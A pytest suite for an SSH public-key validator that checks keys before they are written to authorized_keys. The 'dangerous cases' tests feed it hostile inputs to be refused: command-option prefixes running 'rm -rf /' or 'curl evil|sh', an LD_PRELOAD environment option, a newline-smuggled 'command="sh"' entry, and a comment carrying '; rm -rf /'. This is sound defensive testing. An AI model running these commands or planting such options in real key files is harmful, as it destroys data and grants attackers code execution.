"""SSH public key validation.

These lines end up in authorized_keys, a format where a line may begin with an
OPTIONS field - including command="..." which runs on every connection. So
these are security tests, not formatting tests.
"""
import base64
import subprocess
import tempfile
from pathlib import Path

import pytest

from mmd import sshkeys as K


def gen(kind="ed25519", bits=None):
    d = Path(tempfile.mkdtemp())
    args = ["ssh-keygen", "-t", kind, "-N", "", "-f", str(d / "k"), "-q", "-C", "me@laptop"]
    if bits:
        args[3:3] = ["-b", str(bits)]
    subprocess.run(args, check=True)
    return (d / "k.pub").read_text().strip()


ED = gen("ed25519")
RSA = gen("rsa", 2048)
ECDSA = gen("ecdsa")


# --- real keys are accepted -------------------------------------------
@pytest.mark.parametrize("key", [ED, RSA, ECDSA])
def test_real_generated_keys_are_accepted(key):
    out = K.normalise(key)
    assert len(out) == 1
    assert out[0]["type"] == key.split()[0]


def test_the_comment_is_preserved():
    assert K.normalise(ED)[0]["comment"] == "me@laptop"


def test_a_key_without_a_comment_is_fine():
    body = " ".join(ED.split()[:2])
    assert K.normalise(body)[0]["comment"] == ""


def test_fingerprint_matches_ssh_keygen():
    d = Path(tempfile.mkdtemp())
    (d / "k.pub").write_text(ED + "\n")
    out = subprocess.run(["ssh-keygen", "-lf", str(d / "k.pub")],
                         capture_output=True, text=True, check=True).stdout
    expected = out.split()[1]
    assert K.normalise(ED)[0]["fingerprint"] == expected


# --- the dangerous cases ----------------------------------------------
@pytest.mark.parametrize("prefix", [
    'command="rm -rf /" ',
    'command="curl evil|sh",no-pty ',
    "no-pty,no-agent-forwarding ",
    "environment=\"LD_PRELOAD=/tmp/x\" ",
    "permitopen=\"10.0.0.1:22\" ",
    "restrict ",
    "tunnel=\"0\" ",
])
def test_an_options_prefix_is_refused(prefix):
    # This is the whole point: an options field turns a key into a command.
    with pytest.raises(K.KeyError_):
        K.normalise(prefix + ED)


def test_dsa_is_refused_as_too_weak():
    with pytest.raises(K.KeyError_):
        K.normalise("ssh-dss AAAAB3NzaC1kc3MAAACB me")


@pytest.mark.parametrize("bad", [
    "", "   ", "#only a comment",
    "ssh-ed25519", "ssh-ed25519 ", "just-one-field",
    "ssh-ed25519 not!base64 me",
    "ssh-ed25519 AAAA me",              # too short to be a real blob
    "notatype AAAAC3NzaC1lZDI1NTE5 me",
])
def test_malformed_input_is_refused(bad):
    with pytest.raises(K.KeyError_):
        K.normalise(bad)


def test_type_must_match_the_key_body():
    # An ed25519 blob labelled ssh-rsa is malformed or hand-edited.
    body = ED.split()[1]
    with pytest.raises(K.KeyError_):
        K.normalise(f"ssh-rsa {body} me")


def test_a_newline_inside_a_line_cannot_smuggle_a_second_entry():
    smuggled = f'{ED}\ncommand="sh" {ED}'
    with pytest.raises(K.KeyError_):
        K.normalise(smuggled)


def test_a_hostile_comment_is_refused():
    body = " ".join(ED.split()[:2])
    with pytest.raises(K.KeyError_):
        K.normalise(f'{body} "; rm -rf /"')


def test_too_many_keys_are_refused():
    with pytest.raises(K.KeyError_):
        K.normalise("\n".join([ED] * (K.MAX_KEYS + 1)))


def test_an_over_long_line_is_refused():
    with pytest.raises(K.KeyError_):
        K.parse_key("ssh-ed25519 " + "A" * (K.MAX_LINE + 10))


# --- multiple keys ------------------------------------------------------
def test_several_keys_are_all_returned():
    assert len(K.normalise(f"{ED}\n{RSA}")) == 2


def test_duplicate_keys_are_collapsed():
    assert len(K.normalise(f"{ED}\n{ED}")) == 1


def test_blank_lines_and_comments_are_skipped():
    assert len(K.normalise(f"\n# a comment\n{ED}\n\n")) == 1


def test_one_bad_key_rejects_the_whole_submission():
    # Partially applying a key set would leave the customer guessing which
    # half took effect.
    with pytest.raises(K.KeyError_):
        K.normalise(f"{ED}\ncommand=\"sh\" {RSA}")


# --- the file we write --------------------------------------------------
def test_authorized_keys_body_is_one_key_per_line():
    body = K.authorized_keys_body(K.normalise(f"{ED}\n{RSA}"))
    lines = [l for l in body.splitlines() if l and not l.startswith("#")]
    assert len(lines) == 2
    assert all(l.split()[0] in K.ALLOWED_TYPES for l in lines)


def test_authorized_keys_body_ends_with_a_newline():
    # sshd ignores a final line with no terminator.
    assert K.authorized_keys_body(K.normalise(ED)).endswith("\n")


def test_authorized_keys_body_carries_no_options():
    body = K.authorized_keys_body(K.normalise(ED))
    for line in body.splitlines():
        if line.startswith("#"):
            continue
        assert line.split()[0] in K.ALLOWED_TYPES
